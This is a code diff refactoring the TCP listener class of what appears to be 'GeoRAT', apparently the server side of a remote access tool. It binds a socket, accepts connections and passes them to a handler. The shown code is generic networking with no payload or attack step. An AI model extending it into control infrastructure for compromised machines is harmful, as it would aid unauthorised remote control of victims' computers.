@@ -13,35 +13,32 @@ namespace GeoRAT.Server.Net
     // DataHandler does all work with this socket! 
    
    
-    class NetworkServer
+    class NetworkServer  
     {
 
         #region Declarations
+
         public delegate void Connected(Socket s);
         public event Connected OnConnected;
-
+        internal Socket ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        
-        private Socket ServerSocket;
-        public string  IP { get; private set; }
-        public int     PORT { get; private set; }
         #endregion
 
         #region Constructor
 
-        public NetworkServer(string IP, int PORT)
+        public  NetworkServer(string  addr, int port)
         {
             try
-            {
-                this.IP = IP;
-
-                this.PORT = PORT;
-                ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                ServerSocket.Bind(new IPEndPoint(IPAddress.Parse(IP), PORT));
-                ServerSocket.Listen(200);
+            {   
+                    IPEndPoint endpoint = new IPEndPoint(IPAddress.Parse(addr), port);
+                    ServerSocket.Bind(endpoint);
+                    ServerSocket.Listen(200);
+                    MessageBox.Show(addr + ":" + port, "Listening on", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
             catch (Exception e)
             {
-                MessageBox.Show(e.Message, "Something went wrong", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show(e.Message, "Network error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                 
             }
 
         }
@@ -54,28 +51,20 @@ namespace GeoRAT.Server.Net
 
         private Task<Socket> GetSocket()
         {
+
             return Task<Socket>.Factory.FromAsync(ServerSocket.BeginAccept, ServerSocket.EndAccept, null);
         }
 
         //Here we actually receive socket and pass it to handler using OnConnected event 
         public async void Start()
         {
-            try
+            while (true)
             {
-                while (true) //Keeps accepting new sockets 
-                {
-                    var acceptsock = await GetSocket(); //Socket accepted 
-                    OnConnected?.Invoke(acceptsock); //Rest is up to DataHandler, our job is done. 
-                }
+                var acceptsock = await GetSocket(); //Socket accepted 
+                OnConnected?.Invoke(acceptsock); //Rest is up to DataHandler, our job is done. 
             }
-            catch (Exception e)
-            {
-                MessageBox.Show(e.Message, "OOPS DOOPS!", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
-        }
-
+        }        
     }
-
 
     #endregion
 
